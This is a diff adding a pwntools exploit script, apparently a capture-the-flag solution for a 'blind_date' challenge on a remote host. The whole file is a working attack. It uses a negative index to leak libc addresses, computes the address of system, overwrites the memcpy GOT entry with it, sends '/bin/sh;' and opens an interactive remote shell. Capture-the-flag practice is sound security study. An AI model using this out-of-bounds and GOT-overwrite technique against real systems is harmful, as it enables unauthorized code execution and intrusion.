@@ -1,0 +1,96 @@
+from pwn import *
+from Crypto.Util.number import long_to_bytes
+
+
+lib = ELF("./libc-2.27.so")
+
+r = remote("ipwn.kr", 12509)
+# r = process("./docker/share/blind_date")
+
+cheat_key = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa4294967295'
+
+
+db = 0x4040e0
+
+
+
+r.sendlineafter(" > ", "1")
+r.sendlineafter(": ", "15")
+r.sendlineafter(": ", cheat_key)
+
+r.sendlineafter(" > ", "3")
+
+r.sendlineafter(": ", "-2")
+
+
+r.recvuntil("[+] ")
+
+res = r.recvuntil(" / ")[:-2]
+
+libc = u64(res[:6].ljust(8, b"\x00"))
+print(hex(libc))
+test1 = u64(res[6:12].ljust(8, b"\x00"))
+print(hex(test1))
+
+# libc6_2.31-0ubuntu9.1_amd64
+system = test1 + 	0x055410 - 		0x087e60
+# binsh = libc + 0x19912f - 0x08cc40
+
+# system = libc + lib.symbols['system'] - 		lib.symbols['memcpy']
+# system = libc - (libc%0x100000)+lib.symbols['system']
+# binsh = libc + 0x19912f - 0x08cc40
+
+pause()
+
+
+
+# memcpy got -> system
+# name에 payload
+# phone number에 binsh 주소
+
+
+# 0x404014부터
+payload  = b""
+payload += b"a" * 0x10
+payload += p64(system)
+
+# payload += b"a" * (0x1f * 0x2 - len(payload))
+# payload += b"1"
+# payload += p64(system)
+
+sleep(0.5)
+
+r.sendlineafter(" > ", "1")
+r.sendlineafter(": ", "-2")
+
+
+r.sendlineafter(": ", payload)
+
+payload  = b""
+payload += b"/bin/sh;"
+
+r.sendlineafter(": ", payload)
+
+
+
+r.sendlineafter(": ", "1")
+
+pause()
+
+# r.sendlineafter(": ", "a")
+# r.sendlineafter(": ", "1")
+
+print(hex(libc))
+print(hex(system))
+# print(hex(binsh))
+
+# r.sendlineafter(" > ", "/bin/sh;")
+
+# r.sendlineafter(" > ", "1")
+# r.sendlineafter(": ", "-2")
+
+
+
+
+
+r.interactive()
